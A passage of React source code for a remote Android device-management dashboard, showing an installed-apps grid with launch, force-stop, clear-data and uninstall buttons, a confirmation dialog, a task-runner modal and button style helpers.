              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 6 }}>
                {filteredApps.map(app => (
                  <AppRow
                    key={app.packageName}
                    app={app}
                    isOnline={isOnline}
                    onLaunch={() => cmd('launch_app', { packageName: app.packageName })}
                    onForceStop={() => doAppAction('force_stop_app', app.packageName)}
                    onUninstall={() => doAppAction('uninstall_app', app.packageName)}
                    onClearData={() => doAppAction('clear_app_data', app.packageName)}
                  />
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── CONFIRM DIALOG ─────────────────────────────────────────────── */}
      {confirmApp && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 10000,
        }}>
          <div style={{ background: '#1e293b', borderRadius: 12, padding: 24, width: 340, border: '1px solid #334155' }}>
            <div style={{ fontWeight: 700, marginBottom: 8, color: '#f1f5f9' }}>
              Confirm {confirmApp.action.replace(/_/g, ' ')}
            </div>
            <div style={{ color: '#94a3b8', fontSize: 13, marginBottom: 18, wordBreak: 'break-all' }}>
              {confirmApp.pkg}
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
              <button onClick={() => setConfirmApp(null)} style={{ ...smallBtn('#334155'), color: '#f1f5f9', padding: '7px 16px' }}>Cancel</button>
              <button onClick={confirmAndDo} style={{ ...smallBtn('#dc2626'), padding: '7px 16px' }}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* ── TASK RUNNER MODAL ──────────────────────────────────────────── */}
      {showTaskRunner && (
        <TaskRunnerModal
          device={device}
          results={results}
          onClose={() => setShowTaskRunner(false)}
        />
      )}

      <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }`}</style>
    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function CtrlBtn({ icon, label, onClick, disabled, color }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      title={label}
      style={{
        width: 48, height: 44, border: 'none', borderRadius: 8,
        background: color || '#334155', color: '#f1f5f9',
        fontSize: 17, cursor: disabled ? 'not-allowed' : 'pointer',
        opacity: disabled ? 0.4 : 1,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontWeight: 600, transition: 'background 0.15s', flexShrink: 0,
        flexDirection: 'column', gap: 1,
      }}
    >
      <span>{icon}</span>
      <span style={{ fontSize: 8, color: '#94a3b8', fontWeight: 500 }}>{label}</span>
    </button>
  );
}

function AppRow({ app, isOnline, onLaunch, onForceStop, onUninstall, onClearData }) {
  const [expanded, setExpanded] = useState(false);
  return (
    <div style={{ background: '#162032', borderRadius: 8, border: '1px solid #1e293b', padding: '8px 10px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
        <span style={{ fontSize: 18, flexShrink: 0 }}>{appIcon(app.packageName)}</span>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontWeight: 600, color: '#f1f5f9', fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.appName || app.packageName}
          </div>
          <div style={{ fontSize: 10, color: '#475569', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.packageName}
          </div>
        </div>
        <button onClick={onLaunch} disabled={!isOnline} title="Launch" style={smallBtnStyle('#166534')}>▶ Open</button>
        <button onClick={() => setExpanded(v => !v)} style={smallBtnStyle('#334155')}>{expanded ? '▲' : '⋯'}</button>
      </div>
      {expanded && (
        <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
          <button onClick={onForceStop} disabled={!isOnline} style={smallBtnStyle('#92400e')}>⏹ Force Stop</button>
          <button onClick={onClearData} disabled={!isOnline} style={smallBtnStyle('#1e3a5f')}>🗑 Clear Data</button>
          <button onClick={onUninstall} disabled={!isOnline} style={smallBtnStyle('#7f1d1d')}>✕ Uninstall</button>
          {app.versionName && <span style={{ fontSize: 10, color: '#475569', alignSelf: 'center' }}>v{app.versionName}</span>}
        </div>
      )}
    </div>
  );
}

// ── Style helpers ─────────────────────────────────────────────────────────────

const smallBtn = (bg) => ({
  border: 'none', borderRadius: 6, padding: '5px 11px',
  cursor: 'pointer', fontWeight: 600, fontSize: 12,
  background: bg, color: '#f1f5f9',
  whiteSpace: 'nowrap', transition: 'opacity 0.15s',
});

const smallBtnStyle = bg => ({
  border: 'none', borderRadius: 6, padding: '4px 9px',
  cursor: 'pointer', fontWeight: 600, fontSize: 11,
  background: bg, color: '#f1f5f9', whiteSpace: 'nowrap',
});
